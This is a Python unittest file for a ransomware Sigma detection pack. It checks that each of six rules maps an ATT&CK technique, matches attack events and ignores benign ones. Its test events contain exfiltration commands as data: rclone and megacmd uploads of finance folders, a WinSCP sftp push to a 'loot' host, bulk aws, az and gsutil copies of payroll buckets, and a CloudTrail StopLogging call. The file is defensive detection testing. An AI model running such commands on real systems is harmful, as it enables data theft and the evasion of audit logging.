"""Ransomware Sigma pack: each example loads, maps an ATT&CK technique, matches, and stays quiet on benign events."""

import unittest
from pathlib import Path

from watchpost import sigma

PACK = Path(__file__).resolve().parent.parent / "docs" / "sigma-examples" / "ransomware"
# The only rule that already lived under docs/sigma-examples when this pack was added.
PRIOR_TITLE = "Failed Admin Login From External Source"
PRIOR_ID = "5d2c1a6e-8f3b-4c1e-9a77-0e4b2f6d9c10"

CASES = [
    {
        "file": "external_rdp_logon.yml",
        "rule_id": "sigma_ransomware_entry_via_external_rdp",
        "sigma_id": "7c4e1a90-2b6d-4f58-9c31-0a8e5d2b7f14",
        "technique": "T1133",
        "hits": [
            {"event_type": "auth_success", "dest_port": 3389, "src_ip": "203.0.113.44",
             "user": "administrator", "host": "fileserver01",
             "message": "Accepted password for administrator from 203.0.113.44 port 3389"},
        ],
        "misses": [
            {"event_type": "auth_success", "dest_port": 3389, "src_ip": "10.1.2.3", "user": "administrator"},
            {"event_type": "auth_success", "dest_port": 22, "src_ip": "203.0.113.44", "user": "administrator"},
            {"event_type": "auth_failure", "dest_port": 3389, "src_ip": "203.0.113.44", "user": "administrator"},
            {"event_type": "auth_success", "dest_port": 3389, "src_ip": "::1", "user": "administrator"},
            {"event_type": "auth_success", "dest_port": 3389, "user": "administrator"},
        ],
    },
    {
        "file": "affiliate_network_scan.yml",
        "rule_id": "sigma_ransomware_affiliate_network_scanner",
        "sigma_id": "3b8f0c21-6e14-4a77-8d05-91c2e7a4b6d8",
        "technique": "T1046",
        "hits": [
            {"event_type": "process_start", "user": "corp\\admin", "host": "ws04",
             "message": "C:\\Users\\Public\\Advanced IP Scanner\\advanced_ip_scanner.exe"},
        ],
        "misses": [
            {"event_type": "process_start", "message": "ping 10.0.0.8"},
            {"event_type": "syslog", "message": "masscan 2.1 released"},
            {"event_type": "process_start", "message": "the nmap package is already installed"},
        ],
    },
    {
        "file": "web_service_exfil.yml",
        "rule_id": "sigma_ransomware_web_service_exfiltration",
        "sigma_id": "9e2a6d44-1c70-4b83-a519-6f0d8c3e2a71",
        "technique": "T1567",
        "hits": [
            {"event_type": "process_start",
             "message": "rclone copy D:\\Finance mega:victim-2026 --transfers 16"},
            {"event_type": "process_start",
             "message": "rclone copy D:\\Finance https://mega.nz/folder/abc --header x"},
            {"event_type": "process_start", "message": "megasync.exe --path C:\\Users"},
            {"event_type": "process_start", "message": "megacmd.exe put C:\\Users\\Public /exfil"},
        ],
        "misses": [
            {"event_type": "process_start", "message": "rclone copy /var/data /mnt/backup"},
            {"event_type": "process_start", "message": "chrome.exe https://mega.nz/file/abc"},
            {"event_type": "process_start",
             "message": "allocated megabytes for rclone copy /var/data /mnt/backup"},
            {"event_type": "web_request", "message": "rclone copy D:\\Finance mega:victim"},
        ],
    },
    {
        "file": "scp_offhost_copy.yml",
        "rule_id": "sigma_ransomware_scp_exfiltration",
        "sigma_id": "1d5b7e08-4a92-4c66-b7e3-82f19c0d5a36",
        "technique": "T1048",
        "hits": [
            {"event_type": "process_start",
             "message": "C:\\Windows\\Temp\\WinSCP.exe /command open sftp://loot@203.0.113.8 put C:\\Users"},
        ],
        "misses": [
            {"event_type": "process_start", "message": "nightly backup script finished, scope=finance"},
            {"event_type": "process_start", "message": "scp is not installed"},
            {"event_type": "syslog", "message": "WinSCP.exe started on the jump host"},
        ],
    },
    {
        "file": "cloud_audit_logging_disabled.yml",
        "rule_id": "sigma_ransomware_cloud_logging_disabled",
        "sigma_id": "6a1c9f33-8d27-4e15-9b40-c5e7a2d81460",
        "technique": "T1685.002",  # tagged T1562.008, which ATT&CK revoked
        "hits": [
            {"event_type": "cloud_api_call", "user": "arn:aws:iam::123:user/backup", "src_ip": "203.0.113.50",
             "message": "StopLogging on arn:aws:cloudtrail:us-east-1:123:trail/org"},
        ],
        "misses": [
            {"event_type": "cloud_api_call", "message": "DescribeTrails on org"},
            {"event_type": "cloud_api_call", "message": "CreateLogGroup on /app/api"},
            {"event_type": "syslog",
             "message": "StopLogging on arn:aws:cloudtrail:us-east-1:123:trail/org"},
        ],
    },
    {
        "file": "cloud_storage_staging.yml",
        "rule_id": "sigma_ransomware_cloud_storage_staging",
        "sigma_id": "4f0e8b72-5c31-4d9a-a6e8-17b3d9c0f245",
        "technique": "T1530",
        "hits": [
            {"event_type": "cloud_data_access",
             "message": "aws s3 sync s3://payroll-prod ./loot --only-show-errors"},
            {"event_type": "cloud_data_access",
             "message": "aws s3 cp s3://payroll-prod ./loot --recursive"},
            {"event_type": "cloud_data_access",
             "message": "az storage blob download-batch --source payroll --destination ./loot"},
            {"event_type": "cloud_data_access",
             "message": "gsutil -m cp -r gs://payroll-prod ./loot"},
        ],
        "misses": [
            {"event_type": "cloud_data_access", "message": "GetObject on s3://public/index.html"},
            {"event_type": "cloud_data_access", "message": "aws s3 ls s3://payroll-prod"},
            {"event_type": "cloud_data_access", "message": "aws s3 cp s3://payroll-prod/file.txt ."},
            {"event_type": "process_start", "message": "aws s3 sync s3://payroll-prod ./loot"},
        ],
    },
]


class RansomwarePackTests(unittest.TestCase):
    def test_pack_is_six_new_rules(self):
        files = sorted(p.name for p in PACK.glob("*.yml"))
        self.assertEqual(files, sorted(case["file"] for case in CASES))
        titles, ids, rule_ids = set(), set(), set()
        for case in CASES:
            doc = sigma.parse_yaml((PACK / case["file"]).read_text())
            self.assertEqual(doc["id"], case["sigma_id"])
            self.assertNotIn(doc["title"], titles)
            self.assertNotIn(doc["id"], ids)
            titles.add(doc["title"])
            ids.add(doc["id"])
            self.assertNotEqual(doc["title"], PRIOR_TITLE)
            self.assertNotEqual(doc["id"], PRIOR_ID)
            compiled = sigma.compile_rule((PACK / case["file"]).read_text())
            self.assertEqual(compiled["rule_id"], case["rule_id"])
            self.assertNotIn(compiled["rule_id"], rule_ids)
            rule_ids.add(compiled["rule_id"])
            self.assertEqual([t["id"] for t in compiled["techniques"]], [case["technique"]])

    def test_each_rule_matches_the_attack_and_ignores_benign(self):
        for case in CASES:
            compiled = sigma.compile_rule((PACK / case["file"]).read_text())
            params = compiled["params"]
            for event in case["hits"]:
                with self.subTest(file=case["file"], event=event["message"] if "message" in event else event):
                    self.assertTrue(sigma.matches(params, event))
            for event in case["misses"]:
                with self.subTest(file=case["file"], event=event.get("message", event.get("src_ip"))):
                    self.assertFalse(sigma.matches(params, event))
